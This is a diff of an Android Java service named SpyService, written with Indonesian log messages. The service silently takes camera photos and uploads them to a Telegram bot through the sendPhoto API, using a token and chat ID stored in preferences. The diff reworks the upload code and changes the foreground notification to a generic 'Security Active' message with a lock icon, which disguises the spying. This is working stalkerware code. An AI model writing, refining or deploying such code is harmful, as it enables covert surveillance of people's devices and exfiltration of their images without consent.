@@ -16,35 +16,32 @@ public class SpyService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "SpyService: Service dijalankan.");
+        Log.d(TAG, "SpyService dijalankan.");
         createNotificationChannel();
         
-        // Membangun notifikasi wajib untuk Foreground Service
-        Notification.Builder builder;
+        Notification notification = null;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            builder = new Notification.Builder(this, "SPY_CH");
-        } else {
-            builder = new Notification.Builder(this);
-        }
-
-        Notification notification = builder
-                .setContentTitle("SPYSlepp Security Active")
-                .setContentText("Memantau keamanan perangkat...")
-                .setSmallIcon(android.R.drawable.ic_menu_camera)
+            notification = new Notification.Builder(this, "SPY_CH")
+                .setContentTitle("Security Active")
+                .setContentText("Monitoring device security...")
+                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                 .build();
+        } else {
+            notification = new Notification.Builder(this)
+                .setContentTitle("Security Active")
+                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
+                .build();
+        }
         
         startForeground(1, notification);
 
-        // Ambil konfigurasi yang disimpan MainActivity
         SharedPreferences pref = getSharedPreferences("SpyConfig", MODE_PRIVATE);
         botToken = pref.getString("bot_token", "");
         chatId = pref.getString("chat_id", "");
 
         if (!botToken.isEmpty() && !chatId.isEmpty()) {
-            Log.d(TAG, "SpyService: Konfigurasi ditemukan, mengambil foto...");
             takeSilentPhoto();
         } else {
-            Log.e(TAG, "SpyService: Konfigurasi kosong! Service dihentikan.");
             stopSelf();
         }
 
@@ -61,13 +58,13 @@ public class SpyService extends Service {
             camera.takePicture(null, null, new Camera.PictureCallback() {
                 @Override
                 public void onPictureTaken(byte[] data, Camera camera) {
-                    Log.d(TAG, "SpyService: Foto berhasil diambil, mencoba mengirim...");
+                    Log.d(TAG, "Foto berhasil diambil.");
                     sendToTelegram(data);
                     camera.release();
                 }
             });
         } catch (Exception e) {
-            Log.e(TAG, "SpyService Error Kamera: " + e.getMessage());
+            Log.e(TAG, "Error Kamera: " + e.getMessage());
             stopSelf();
         }
     }
@@ -76,44 +73,42 @@ public class SpyService extends Service {
         new Thread(new Runnable() {
             @Override
             public void run() {
+                HttpURLConnection conn = null;
                 try {
-                    String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
-                    URL url = new URL(urlString);
-                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    Log.d(TAG, "Mengirim ke Telegram...");
+                    URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto");
+                    conn = (HttpURLConnection) url.openConnection();
                     conn.setDoOutput(true);
                     conn.setRequestMethod("POST");
-                    
-                    String boundary = "===" + System.currentTimeMillis() + "===";
+                    String boundary = "----" + System.currentTimeMillis();
                     conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
 
                     OutputStream out = conn.getOutputStream();
-                    PrintWriter writer = new PrintWriter(new OutputStreamWriter(out, "UTF-8"), true);
+                    DataOutputStream request = new DataOutputStream(out);
 
-                    // Part Chat ID
-                    writer.append("--" + boundary).append("\r\n");
-                    writer.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
-                    writer.append(chatId).append("\r\n");
+                    // Chat ID
+                    request.writeBytes("--" + boundary + "\r\n");
+                    request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
+                    request.writeBytes(chatId + "\r\n");
 
-                    // Part Photo
-                    writer.append("--" + boundary).append("\r\n");
-                    writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"security_capture.jpg\"").append("\r\n");
-                    writer.append("Content-Type: image/jpeg").append("\r\n\r\n");
-                    writer.flush();
+                    // Photo
+                    request.writeBytes("--" + boundary + "\r\n");
+                    request.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"spy.jpg\"\r\n");
+                    request.writeBytes("Content-Type: image/jpeg\r\n\r\n");
+                    request.write(photoData);
+                    request.writeBytes("\r\n");
 
-                    out.write(photoData);
-                    out.flush();
-                    
-                    writer.append("\r\n");
-                    writer.append("--" + boundary + "--").append("\r\n");
-                    writer.close();
+                    request.writeBytes("--" + boundary + "--\r\n");
+                    request.flush();
+                    request.close();
 
                     int responseCode = conn.getResponseCode();
-                    Log.d(TAG, "SpyService: Pengiriman selesai. Kode Respon: " + responseCode);
-                    
-                    stopForeground(true);
-                    stopSelf();
+                    Log.d(TAG, "Response Code Telegram: " + responseCode);
                 } catch (Exception e) {
-                    Log.e(TAG, "SpyService Pengiriman Gagal: " + e.getMessage());
+                    Log.e(TAG, "Gagal kirim Telegram: " + e.getMessage());
+                } finally {
+                    if (conn != null) conn.disconnect();
+                    stopForeground(true);
                     stopSelf();
                 }
             }
